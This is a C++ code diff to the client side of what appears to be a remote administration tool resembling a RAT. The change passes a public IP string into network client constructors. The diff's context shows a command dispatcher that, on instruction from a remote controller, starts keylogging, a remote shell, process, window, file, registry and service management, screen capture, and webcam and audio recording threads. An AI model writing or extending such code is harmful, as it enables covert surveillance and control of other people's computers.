@@ -17,16 +17,16 @@
 #include "IOCPKCPClient.h"
 
 // UDP 协议仅能针对小包数据，且数据没有时序关联
-IOCPClient* NewNetClient(CONNECT_ADDRESS* conn, State& bExit, bool exit_while_disconnect) {
+IOCPClient* NewNetClient(CONNECT_ADDRESS* conn, State& bExit, const std::string& publicIP, bool exit_while_disconnect) {
 	if (conn->protoType == PROTO_HTTPS) return NULL;
 
 	int type = conn->protoType == PROTO_RANDOM ? time(nullptr) % PROTO_RANDOM : conn->protoType;
 	if (!conn->IsVerified() || type == PROTO_TCP)
-		return new IOCPClient(bExit, exit_while_disconnect, MaskTypeNone, conn->GetHeaderEncType());
+		return new IOCPClient(bExit, exit_while_disconnect, MaskTypeNone, conn->GetHeaderEncType(), publicIP);
 	if (type == PROTO_UDP)
 		return new IOCPUDPClient(bExit, exit_while_disconnect);
 	if (type == PROTO_HTTP || type == PROTO_HTTPS)
-		return new IOCPClient(bExit, exit_while_disconnect, MaskTypeHTTP, conn->GetHeaderEncType());
+		return new IOCPClient(bExit, exit_while_disconnect, MaskTypeHTTP, conn->GetHeaderEncType(), publicIP);
 	if (type == PROTO_KCP) {
 		return new IOCPKCPClient(bExit, exit_while_disconnect);
 	}
@@ -34,10 +34,10 @@ IOCPClient* NewNetClient(CONNECT_ADDRESS* conn, State& bExit, bool exit_while_di
 	return NULL;
 }
 
-ThreadInfo* CreateKB(CONNECT_ADDRESS* conn, State& bExit) {
+ThreadInfo* CreateKB(CONNECT_ADDRESS* conn, State& bExit, const std::string &publicIP) {
 	static ThreadInfo tKeyboard;
 	tKeyboard.run = FOREVER_RUN;
-	tKeyboard.p = new IOCPClient(bExit, false, MaskTypeNone, conn->GetHeaderEncType());
+	tKeyboard.p = new IOCPClient(bExit, false, MaskTypeNone, conn->GetHeaderEncType(), publicIP);
 	tKeyboard.conn = conn;
 	tKeyboard.h = (HANDLE)__CreateThread(NULL, NULL, LoopKeyboardManager, &tKeyboard, 0, NULL);
 	return &tKeyboard;
@@ -377,6 +377,7 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 		m_hThread[m_ulThreadCount].p = nullptr;
 		m_hThread[m_ulThreadCount].conn = m_conn;
 	}
+	std::string publicIP = m_ClientObject->GetClientIP();
 
 	switch (szBuffer[0])
 	{
@@ -478,7 +479,7 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 	}
 
 	case COMMAND_PROXY: {
-		m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true, MaskTypeNone, m_conn->GetHeaderEncType());
+		m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true, MaskTypeNone, m_conn->GetHeaderEncType(), publicIP);
 		m_hThread[m_ulThreadCount++].h = __CreateThread(NULL, 0, LoopProxyManager, &m_hThread[m_ulThreadCount], 0, NULL);;
 		break;
 	}
@@ -536,7 +537,7 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 			if (m_hKeyboard) {
 				CloseHandle(__CreateThread(NULL, 0, SendKeyboardRecord, m_hKeyboard->user, 0, NULL));
 			} else {
-				m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true, MaskTypeNone, m_conn->GetHeaderEncType());
+				m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true, MaskTypeNone, m_conn->GetHeaderEncType(), publicIP);
 				m_hThread[m_ulThreadCount++].h = __CreateThread(NULL, 0, LoopKeyboardManager, &m_hThread[m_ulThreadCount], 0, NULL);;
 			}
 			break;
@@ -544,7 +545,7 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 
 	case COMMAND_TALK:
 		{
-			m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true, MaskTypeNone, m_conn->GetHeaderEncType());
+			m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true, MaskTypeNone, m_conn->GetHeaderEncType(), publicIP);
 			m_hThread[m_ulThreadCount].user = m_hInstance; 
 			m_hThread[m_ulThreadCount++].h = __CreateThread(NULL,0, LoopTalkManager, &m_hThread[m_ulThreadCount], 0, NULL);;
 			break;
@@ -552,21 +553,21 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 
 	case COMMAND_SHELL:
 		{
-			m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true, MaskTypeNone, m_conn->GetHeaderEncType());
+			m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true, MaskTypeNone, m_conn->GetHeaderEncType(), publicIP);
 			m_hThread[m_ulThreadCount++].h = __CreateThread(NULL,0, LoopShellManager, &m_hThread[m_ulThreadCount], 0, NULL);;
 			break;
 		}
 
 	case COMMAND_SYSTEM:       //远程进程管理
 		{
-			m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true, MaskTypeNone, m_conn->GetHeaderEncType());
+			m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true, MaskTypeNone, m_conn->GetHeaderEncType(), publicIP);
 			m_hThread[m_ulThreadCount++].h = __CreateThread(NULL, 0, LoopProcessManager, &m_hThread[m_ulThreadCount], 0, NULL);;
 			break;
 		}
 
 	case COMMAND_WSLIST:       //远程窗口管理
 		{
-			m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true, MaskTypeNone, m_conn->GetHeaderEncType());
+			m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true, MaskTypeNone, m_conn->GetHeaderEncType(), publicIP);
 			m_hThread[m_ulThreadCount++].h = __CreateThread(NULL,0, LoopWindowManager, &m_hThread[m_ulThreadCount], 0, NULL);;
 			break;
 		}
@@ -595,7 +596,7 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 				memcpy(user->buffer, szBuffer + 1, ulLength - 1);
 				if (ulLength > 2 && !m_conn->IsVerified()) user->buffer[2] = 0;
 			}
-			m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true, MaskTypeNone, m_conn->GetHeaderEncType());
+			m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true, MaskTypeNone, m_conn->GetHeaderEncType(), publicIP);
 		    m_hThread[m_ulThreadCount].user = user;
 			m_hThread[m_ulThreadCount++].h = __CreateThread(NULL,0, LoopScreenManager, &m_hThread[m_ulThreadCount], 0, NULL);;
 			break;
@@ -603,7 +604,7 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 
 	case COMMAND_LIST_DRIVE :
 		{
-			m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true, MaskTypeNone, m_conn->GetHeaderEncType());
+			m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true, MaskTypeNone, m_conn->GetHeaderEncType(), publicIP);
 			m_hThread[m_ulThreadCount++].h = __CreateThread(NULL,0, LoopFileManager, &m_hThread[m_ulThreadCount], 0, NULL);;
 			break;
 		}
@@ -612,28 +613,28 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 		{
 			static bool hasCamera = WebCamIsExist();
 			if (!hasCamera) break;
-			m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true, MaskTypeNone, m_conn->GetHeaderEncType());
+			m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true, MaskTypeNone, m_conn->GetHeaderEncType(), publicIP);
 			m_hThread[m_ulThreadCount++].h = __CreateThread(NULL,0, LoopVideoManager, &m_hThread[m_ulThreadCount], 0, NULL);;
 			break;
 		}
 
 	case COMMAND_AUDIO:
 		{
-			m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true, MaskTypeNone, m_conn->GetHeaderEncType());
+			m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true, MaskTypeNone, m_conn->GetHeaderEncType(), publicIP);
 			m_hThread[m_ulThreadCount++].h = __CreateThread(NULL,0, LoopAudioManager, &m_hThread[m_ulThreadCount], 0, NULL);;
 			break;
 		}
 
 	case COMMAND_REGEDIT:
 		{
-			m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true, MaskTypeNone, m_conn->GetHeaderEncType());
+			m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true, MaskTypeNone, m_conn->GetHeaderEncType(), publicIP);
 			m_hThread[m_ulThreadCount++].h = __CreateThread(NULL,0, LoopRegisterManager, &m_hThread[m_ulThreadCount], 0, NULL);;
 			break;
 		}
 
 	case COMMAND_SERVICES:
 		{
-			m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true, MaskTypeNone, m_conn->GetHeaderEncType());
+			m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true, MaskTypeNone, m_conn->GetHeaderEncType(), publicIP);
 			m_hThread[m_ulThreadCount++].h = __CreateThread(NULL,0, LoopServicesManager, &m_hThread[m_ulThreadCount], 0, NULL);
 			break;
 		}
